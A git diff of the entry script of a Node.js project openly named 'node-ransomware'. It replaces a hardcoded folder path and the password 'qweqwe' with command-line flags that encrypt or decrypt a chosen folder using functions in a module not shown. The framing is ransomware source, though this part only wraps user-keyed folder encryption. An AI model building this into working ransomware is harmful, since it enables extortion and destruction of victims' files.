@@ -1,18 +1,26 @@
 require('dotenv').config();
+const {
+  argv: { f: FOLDER, a: ALGORITHM, p: PASSWORD, d, e },
+} = require('yargs')
+  .usage(
+    'Usage: $0 --f [folder] --a [algorithm] --p [password] --d (decode)  --e (encode)'
+  )
+  .boolean(['d', 'e'])
+  .demandOption(['f', 'a', 'p']);
+
 const { encodeFolder, decodeFolder } = require('./app');
 const logger = require('./utils/logger');
 
-const FOLDER = '/Users/edson.perez/Desktop/node-ransomware/toEncode';
-const ALGORITHM = 'aes-192-cbc';
-const PASSWORD = 'qweqwe';
-
-logger.info(
-  `Starting in ${process.env.NODE_ENV} mode and logger ${process.env.LOGGER_LEVEL} mode`
-);
+logger.debug(`Starting ransomware, logger in ${process.env.LOGGER_LEVEL} mode`);
 
 try {
-  encodeFolder(FOLDER, ALGORITHM, PASSWORD);
-  // decodeFolder(FOLDER, ALGORITHM, PASSWORD);
+  if (d) {
+    decodeFolder(FOLDER, ALGORITHM, PASSWORD);
+  } else if (e) {
+    encodeFolder(FOLDER, ALGORITHM, PASSWORD);
+  } else {
+    logger.error('Need a --d for decode or --e for encode');
+  }
 } catch (error) {
   logger.error(error);
 }
